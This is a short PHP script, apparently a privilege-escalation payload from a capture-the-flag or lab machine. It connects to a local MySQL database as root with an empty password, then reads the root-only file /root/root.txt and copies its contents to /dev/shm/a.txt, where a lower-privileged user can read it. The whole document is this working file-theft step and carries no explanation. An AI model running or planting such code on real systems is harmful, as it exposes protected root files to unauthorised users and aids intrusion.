<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "integrity";

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$f = file_get_contents('/root/root.txt');
$myfile = fopen("/dev/shm/a.txt", "w") or die("Unable to open file!");
fwrite($myfile, $f);
fclose($myfile);
?>
